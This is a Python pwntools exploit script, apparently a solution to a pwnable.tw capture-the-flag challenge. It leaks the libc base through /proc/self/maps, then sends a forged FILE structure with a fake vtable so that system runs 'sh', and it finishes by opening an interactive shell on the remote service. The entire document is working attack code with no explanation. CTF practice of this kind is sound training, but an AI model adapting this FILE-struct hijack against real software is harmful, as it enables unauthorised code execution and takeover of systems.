from pwn import *
import time
#r = process("/home/ccccc/S", env={"LD_PRELOAD" : "./libc_32.so.6"})
r = remote('chall.pwnable.tw','10200')

fp_address = 0x0804B280
magic_buf = 0x0804B0C0
name_address = 0x0804B260
def open_file(file_name):
    r.sendlineafter(b'Your choice :',b'1')
    r.sendlineafter(b'see :',file_name)


### leak libc_base

open_file(b'/proc/self/maps')
r.sendlineafter(b'Your choice :',b'2')
r.sendlineafter(b'Your choice :',b'3')
r.recvuntil(b'[heap]\n')
libc_base = int(r.recv(8),16) + 0x1000
print(hex(libc_base))

# ### overwrite FILE struct


# # gadget 
system_offset = 0x3a940
main_addr = 0x08048A37
r.sendlineafter(b'Your choice :',b'5')

# payload  = b'/bin/sh;' + p32(0x08048A37) + p32(0)
payload = b'AAAA;sh;#'.ljust(0x20,b'A')   ### add '#' to comment garbage
payload += p32(name_address) #fp
payload  = payload.ljust(0x48,b'A')
payload += p32(0x804ba41)  # _IO_lock_t *_lock
payload += p32(0x804b2ac)  #vtable  call   DWORD PTR [eax+0x8]
payload += b'A'*4 + p32(libc_base + system_offset)  ## function to call

time.sleep(0.1)
r.sendlineafter(b'name :',payload)


r.interactive()